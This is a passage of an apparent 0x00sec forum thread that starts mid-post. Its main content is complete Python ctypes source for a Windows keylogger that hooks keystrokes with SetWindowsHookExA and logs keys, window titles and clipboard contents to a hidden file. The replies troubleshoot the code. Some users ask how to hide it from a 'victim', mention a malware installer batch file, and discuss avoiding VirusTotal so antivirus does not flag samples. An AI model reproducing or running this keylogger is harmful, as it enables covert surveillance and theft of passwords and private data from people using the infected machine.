<p>There are other ways to build a standalone executable but we will cover these later. PyInstaller is my favorite because I use it for many other things, therefore I really want to find a solution!</p>
<p>In part 3, we will look at how to dump credentials with standard user privileges. This time it‚Äôs going to be a lot simpler. We will use PyWin32 so it‚Äôs unlikely that we‚Äôll have to write any WinAPI calls from scratch. I don‚Äôt even think we‚Äôll need ctypes period.</p>
<p>You‚Äôll find the complete keylogger code below and here: <a href="../../../external.html?link=https://github.com/tr4cefl0w/0x00sec/tree/master/python-malware" rel="noopener nofollow ugc">https://github.com/tr4cefl0w/0x00sec/tree/master/python-malware</a></p>
<p>Thanks to <a class="mention" href="../../u/dtm.html">@dtm</a> for the tip and to that guy on HackerThreads showing how create a hook with Python (kind of).</p>
<pre><code class="lang-auto"># KEYLOGGER WITH CTYPES AND SETWINDOWSHOOKEX FROM MY 0X00SEC POST.
# THIS IS A PROOF-OF-CONCEPT AND I AM NOT RESPONSIBLE FOR ANY 
# USAGE OF THIS CODE OR MALICIOUS PURPOSE.

from ctypes import *
from ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG
import logging
import os

logging.basicConfig(filename=(os.environ['localappdata'] +"\\" + 'applog.txt'), 
                    level=logging.DEBUG, format='%(message)s')

# Load the required librairies
user32 = windll.user32
kernel32 = windll.kernel32


current_window = None   # Holds the current window title
current_clipboard = []  # Holds the current clipboard content
last_key = None         # Holds the last key pressed
line = ""               # Holds the lines of keyboard characters pressed


WH_KEYBOARD_LL = 13     # Hook ID to pass to SetWindowsExA
WM_KEYDOWN = 0x0100     # VM_KEYDOWN message code
HC_ACTION = 0           # Parameter for KeyboardProc callback function

# VIRTUAL KEYS CODES: Needed to handle special keys such as CTRL or RETURN
# Reference: http://nehe.gamedev.net/article/msdn_virtualkey_codes/15009/
VIRTUAL_KEYS = {'RETURN': 0x0D,
                'CONTROL': 0x11,
                'SHIFT': 0x10,
                'MENU': 0x12,
                'TAB': 0x09,
                'BACKSPACE': 0x08,
                'CLEAR': 0x0C,
                'CAPSLOCK': 0x14,
                'ESCAPE': 0x1B,
                'HOME': 0x24,
                'INS': 0x2D,
                'DEL': 0x2E,
                'END': 0x23,
                'PRINTSCREEN': 0x2C,
                'CANCEL': 0x03,
                'BACK': 0x08,
                'LBUTTON': 0x01
                }

HOOKPROC = WINFUNCTYPE(HRESULT, c_int, WPARAM, LPARAM) # Callback function

class KBDLLHOOKSTRUCT(Structure): _fields_=[ 
    ('vkCode',DWORD),
    ('scanCode',DWORD),
    ('flags',DWORD),
    ('time',DWORD),
    ('dwExtraInfo',DWORD)]

class hook:
    """
    Class for installing/uninstalling a hook
    """

    def __init__(self):
        """
        Constructor for the hook class.

        Responsible for allowing methods to call functions from
        user32.dll and kernel32.dll.
        """
        self.user32 = user32
        self.kernel32 = kernel32
        self.is_hooked = None


    def install_hook(self, ptr):
        """
        Method for installing hook.

        Arguments
            ptr: pointer to the HOOKPROC callback function
        """
        self.is_hooked = self.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            ptr,
            kernel32.GetModuleHandleW(None),
            0
        )

        if not self.is_hooked:
            return False
        return True

    def uninstall_hook(self):
        """
        Method for uninstalling the hook.
        """

        if self.is_hooked is None:
            return
        self.user32.UnhookWindowsHookEx(self.is_hooked)
        self.is_hooked = None


def get_current_window(): # Function to grab the current window and its title

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow() # Get handle to foreground window
    length = GetWindowTextLength(hwnd) # Get length of the window text in title bar
    buff = create_unicode_buffer(length + 1) # Create buffer to store the window title buff
    
    GetWindowText(hwnd, buff, length + 1) # Get window title and store in buff

    return buff.value # Return the value of buff

def get_clipboard():
    
    CF_TEXT = 1 # Set clipboard format

    # Argument and return types for GlobalLock/GlobalUnlock.
    kernel32.GlobalLock.argtypes = [c_void_p]
    kernel32.GlobalLock.restype = c_void_p
    kernel32.GlobalUnlock.argtypes = [c_void_p]

    # Return type for GetClipboardData
    user32.GetClipboardData.restype = c_void_p
    user32.OpenClipboard(0)
    
    # Required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT): # If CF_TEXT is available
            data = GetClipboardData(CF_TEXT) # Get handle to data in clipboard
            data_locked = kernel32.GlobalLock(data) # Get ptr to memory location where the data is located
            text = c_char_p(data_locked) # Get a char * ptr (buff in Python) to the location of data_locked
            value = text.value # Dump the content in value
            kernel32.GlobalUnlock(data_locked) # Decrement de lock count
            return value.decode('latin1') # Return the clipboard content
    finally:
        CloseClipboard() # Close the clipboard

def hook_procedure(nCode, wParam, lParam):
    """
    Hook procedure to monitor and log keyboard events.

    Arguments:
        nCode       = HC_ACTION code
        wParam      = Keyboard event message code
        lParam      = Address of keyboard input event

    """

    # Need to be global so they're not emptied at every key pressed
    global last_key
    global current_clipboard
    global line
    global current_window

    if current_window != get_current_window():
        current_window = get_current_window()
        logging.info('[WINDOW] ' + current_window)
    
    
    # Remove comments below if you want to the possibility to uninstall the hook when testing.
    """
    if user32.GetKeyState(VIRTUAL_KEYS['CONTROL']) &amp; 0x8000:
        hook.uninstall_hook()
        return 0
    """

    if nCode == HC_ACTION and wParam == WM_KEYDOWN:

        kb = KBDLLHOOKSTRUCT.from_address(lParam)
        user32.GetKeyState(VIRTUAL_KEYS['SHIFT'])
        user32.GetKeyState(VIRTUAL_KEYS['MENU'])
        state = (c_char * 256)()
        user32.GetKeyboardState(byref(state))
        buff = create_unicode_buffer(8)
        n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, buff, 8 - 1, 0)
        key = wstring_at(buff)     # Key pressed as buffer
        if n &gt; 0:

            # Avoid logging weird characters. If they show up,
            # get the hex code here http://asciivalue.com/index.php
            # and add to VIRTUAL_KEYS
            if kb.vkCode not in VIRTUAL_KEYS.values():
                line += key

            for key, value in VIRTUAL_KEYS.items(): 
                if kb.vkCode == value:
                    logging.info(key)

            if kb.vkCode == VIRTUAL_KEYS['RETURN']:
                logging.info(line)
                line = ""

            if current_clipboard != get_clipboard():
                current_clipboard = get_clipboard()
                logging.info('[CLIPBOARD] ' + current_clipboard + '\n')

    return user32.CallNextHookEx(hook.is_hooked, nCode, wParam, c_ulonglong(lParam))

hook = hook()                           # Hook class
ptr = HOOKPROC(hook_procedure)          # Pointer to the callback function
hook.install_hook(ptr)                  # Installing hook
msg = MSG()                             # MSG data structure
user32.GetMessageA(byref(msg), 0, 0, 0) # Wait for messages to be posted

</code></pre>
<p><strong>EDIT 1:</strong> Added support for special characters and removed a sentence related to that issue.<br>
<strong>EDIT 2:</strong> Fixed some typos<br>
<strong>EDIT 3:</strong> Changed the link to the Github repo as the structure changed.<br>
<strong>EDIT 4:</strong> Fixed typo in code snippet.<br>
References:<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="../../../external.html?link=http://www.hackerthreads.org/Topic-42395" target="_blank" rel="noopener nofollow ugc">hackerthreads.org</a>
  </header>
  <article class="onebox-body">
    <img src="#" class="thumbnail" width="" height="">

<h3><a href="../../../external.html?link=http://www.hackerthreads.org/Topic-42395" target="_blank" rel="noopener nofollow ugc">[python] KeyboardHook class - hackerthreads.org</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="../../../external.html?link=https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex" target="_blank" rel="noopener nofollow ugc">docs.microsoft.com</a>
  </header>
  <article class="onebox-body">
    <img src="../../../0x00sec.s3.amazonaws.com/original/2X/0/046bc4e1c9cc27618d0390eaf9e35705a1a77356.png" class="thumbnail" width="" height="">

<h3><a href="../../../external.html?link=https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex" target="_blank" rel="noopener nofollow ugc">CallNextHookEx function (winuser.h) - Win32 apps</a></h3>

<p>Passes the hook information to the next hook procedure in the current hook chain. A hook procedure can call this function either before or after processing the hook information.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="../../../external.html?link=https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-tounicode" target="_blank" rel="noopener nofollow ugc">docs.microsoft.com</a>
  </header>
  <article class="onebox-body">
    <img src="../../../0x00sec.s3.amazonaws.com/original/2X/0/046bc4e1c9cc27618d0390eaf9e35705a1a77356.png" class="thumbnail" width="" height="">

<h3><a href="../../../external.html?link=https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-tounicode" target="_blank" rel="noopener nofollow ugc">ToUnicode function (winuser.h) - Win32 apps</a></h3>

<p>Translates the specified virtual-key code and keyboard state to the corresponding Unicode character or characters.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="../../../external.html?link=https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-keydown" target="_blank" rel="noopener nofollow ugc">docs.microsoft.com</a>
  </header>
  <article class="onebox-body">
    <img src="../../../0x00sec.s3.amazonaws.com/original/2X/0/046bc4e1c9cc27618d0390eaf9e35705a1a77356.png" class="thumbnail" width="" height="">

<h3><a href="../../../external.html?link=https://docs.microsoft.com/en-us/windows/win32/inputdev/wm-keydown" target="_blank" rel="noopener nofollow ugc">WM_KEYDOWN message (Winuser.h) - Win32 apps</a></h3>

<p>Posted to the window with the keyboard focus when a nonsystem key is pressed. A nonsystem key is a key that is pressed when the ALT key is not pressed.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="../../../external.html?link=https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa" target="_blank" rel="noopener nofollow ugc">docs.microsoft.com</a>
  </header>
  <article class="onebox-body">
    <img src="../../../0x00sec.s3.amazonaws.com/original/2X/0/046bc4e1c9cc27618d0390eaf9e35705a1a77356.png" class="thumbnail" width="" height="">

<h3><a href="../../../external.html?link=https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa" target="_blank" rel="noopener nofollow ugc">SetWindowsHookExA function (winuser.h) - Win32 apps</a></h3>

<p>Installs an application-defined hook procedure into a hook chain.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<a href="../../../external.html?link=https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-tagmsg" class="onebox" target="_blank" rel="noopener nofollow ugc">https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-tagmsg</a><br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="../../../external.html?link=http://www.winprog.org/tutorial/message_loop.html" target="_blank" rel="noopener nofollow ugc">winprog.org</a>
  </header>
  <article class="onebox-body">
    <img src="#" class="thumbnail" width="" height="">

<h3><a href="../../../external.html?link=http://www.winprog.org/tutorial/message_loop.html" target="_blank" rel="noopener nofollow ugc">Tutorial: Understanding the Message Loop</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="19" />
              <span class='post-likes'>19 Likes</span>
            </div>

                <div class='crawler-linkback-list' itemscope itemtype='../../../external.html?link=http://schema.org/ItemList'>
                      <div itemprop='itemListElement' itemscope itemtype='../../../external.html?link=http://schema.org/ListItem'>
                        <a itemprop='url' href="../../../external.html?link=https://0x00sec.org/t/python-windows-keylogger/11939">Python Windows Keylogger</a>
                        <meta itemprop='position' content='11'>
                      </div>
                </div>

            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/BrokenAdministrator.html'><span itemprop='name'>BrokenAdministrator</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-02-28T13:08:47Z' class='post-time'>
                    February 28, 2019,  1:08pm
                  </time>
                  <meta itemprop='dateModified' content='2019-02-28T13:08:47Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>The a pip module <code>keyboard</code> can be buggy, but I spent some time working with it and developed a keylogger with it, I found that it was not that bad of a library. Although the API documentation was not the best, albeit. I was planning on posting about it recently. Care to discuss ideas via PM?</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/tr4cefl0w.html'><span itemprop='name'>tr4cefl0w</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-02-28T13:25:26Z' class='post-time'>
                    February 28, 2019,  1:25pm
                  </time>
                  <meta itemprop='dateModified' content='2019-02-28T13:25:26Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Sure man, feel free to message me anytime. I‚Äôm on the IRC server and Discord too, same username. Something higher level would have been better as I wanted this to be more of an intro but I felt I didn‚Äôt had much choice this time lol</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_4' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Djimbu.html'><span itemprop='name'>Djimbu</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-02-28T19:39:01Z' class='post-time'>
                    February 28, 2019,  7:39pm
                  </time>
                  <meta itemprop='dateModified' content='2019-02-28T19:39:01Z'>
              <span itemprop='position'>4</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Trying to get this working on my windows 10 box.<br>
Error line 206 in hook_procedure<br>
return user32.CallNextHookEx(hook.is_hooked, nCode, wParam, c_ulonglong(1Param))<br>
ValueError: Procedure probably called with too many arguments (4 bytes in excess)</p>
<p>What do you think this could be?  I‚Äôm stumped</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_5' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/tr4cefl0w.html'><span itemprop='name'>tr4cefl0w</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-02-28T21:08:36Z' class='post-time'>
                    February 28, 2019,  9:08pm
                  </time>
                  <meta itemprop='dateModified' content='2019-02-28T21:08:36Z'>
              <span itemprop='position'>5</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>My guess is that you‚Äôre using Python 3.x 32-bit instead of 64-bit. Are you running Windows 10 32-bit? Else, use Python 64-bit. Because I‚Äôm developing on 64-bit, I typecast <code>1Param</code> as <code>c_ulonglong</code>. You just have to change it to <code>c_ulong</code> and it should work.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Djimbu.html'><span itemprop='name'>Djimbu</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-02-28T21:51:01Z' class='post-time'>
                    February 28, 2019,  9:51pm
                  </time>
                  <meta itemprop='dateModified' content='2019-02-28T21:51:01Z'>
              <span itemprop='position'>6</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>You;re the man dude, thank you.  Love your project btw</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_7' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/xXxH4CK0RxXx.html'><span itemprop='name'>xXxH4CK0RxXx</span></a>
                (Lulumichen)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-02T20:35:47Z' class='post-time'>
                    March 2, 2019,  8:35pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-02T20:35:47Z'>
              <span itemprop='position'>7</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>what about making it hidden from the victim? what code should we put and where?</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_8' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/BrokenAdministrator.html'><span itemprop='name'>BrokenAdministrator</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-02T22:21:18Z' class='post-time'>
                    March 2, 2019, 10:21pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-02T22:21:18Z'>
              <span itemprop='position'>8</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>I‚Äôve written a batch file for ‚Äúinstalling‚Äù my malware on the user‚Äôs system. It hides the folders and does the first parts of work for me.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_9' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/tr4cefl0w.html'><span itemprop='name'>tr4cefl0w</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-03T00:05:06Z' class='post-time'>
                    March 3, 2019, 12:05am
                  </time>
                  <meta itemprop='dateModified' content='2019-03-03T00:05:06Z'>
              <span itemprop='position'>9</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>That will be covered in a later part.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_10' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/xXxH4CK0RxXx.html'><span itemprop='name'>xXxH4CK0RxXx</span></a>
                (Lulumichen)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-03T13:15:18Z' class='post-time'>
                    March 3, 2019,  1:15pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-03T13:15:18Z'>
              <span itemprop='position'>10</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>thanks, also I ran the file and it didn‚Äôt let me type anything so I had to restart my computer and delete the program, it still logged it though.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_11' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/zz0eyu.html'><span itemprop='name'>zz0eyu</span></a>
                
              </span>


                <link itemprop="image" href="../../../0x00sec.s3.amazonaws.com/original/2X/a/a5149bc60b73b18bef14b1a94eb5f76e4d9c9251.png">

              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-12T04:51:40Z' class='post-time'>
                    March 12, 2019,  4:51am
                  </time>
                  <meta itemprop='dateModified' content='2019-03-12T04:51:40Z'>
              <span itemprop='position'>11</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Find a typo here<br>
<div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/a/a5149bc60b73b18bef14b1a94eb5f76e4d9c9251.png" data-download-href="/uploads/short-url/nymW2pDp6FuriSBlCvMdmVteeZj.png?dl=1" title="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20190312124828" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/a/a5149bc60b73b18bef14b1a94eb5f76e4d9c9251.png" alt="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20190312124828" data-base62-sha1="nymW2pDp6FuriSBlCvMdmVteeZj" width="690" height="303"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20190312124828</span><span class="informations">775√ó341 22.3 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>and what‚Äôs the use of these two lines of code?</p>
<aside class="quote no-group quote-modified" data-username="tr4cefl0w" data-post="1" data-topic="11858">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="../../letter_avatar_proxy/v4/letter/t/c2a13f/48.png" class="avatar"> tr4cefl0w:</div>
<blockquote>
<p>user32.GetKeyState(VIRTUAL_KEYS[‚ÄòSHIFT‚Äô])<br>
user32.GetKeyState(VIRTUAL_KEYS[‚ÄòMENU‚Äô])</p>
</blockquote>
</aside>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_12' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/CaasiNewton.html'><span itemprop='name'>CaasiNewton</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-12T11:53:15Z' class='post-time'>
                    March 12, 2019, 11:53am
                  </time>
                  <meta itemprop='dateModified' content='2019-03-12T11:53:15Z'>
              <span itemprop='position'>12</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Hi guys, I read in some places not to put files in the virustotal because it divulges the information with some companies of antivirus and some antivirus that does not recognize the malware / trojan begin to identify. I always post on <a href="../../../external.html?link=http://www.nodistribute.com/" rel="nofollow noopener">http://www.nodistribute.com/</a>.<br>
I would like to know the members here, because I have already seen some posts of members uploading in Virustotal.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_13' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/tr4cefl0w.html'><span itemprop='name'>tr4cefl0w</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-12T15:31:36Z' class='post-time'>
                    March 12, 2019,  3:31pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-12T15:31:36Z'>
              <span itemprop='position'>13</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Hey thanks for reporting the typo. It‚Äôs fixed.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_14' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/system.html'><span itemprop='name'>system</span></a>
                (system)
                  Closed 
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-27T03:02:21Z' class='post-time'>
                    March 27, 2019,  3:02am
                  </time>
                  <meta itemprop='dateModified' content='2019-03-27T03:02:21Z'>
              <span itemprop='position'>14</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="ORrASAIwUdacreMJ5pfXntoYt"></script>
  </body>
  
</html>
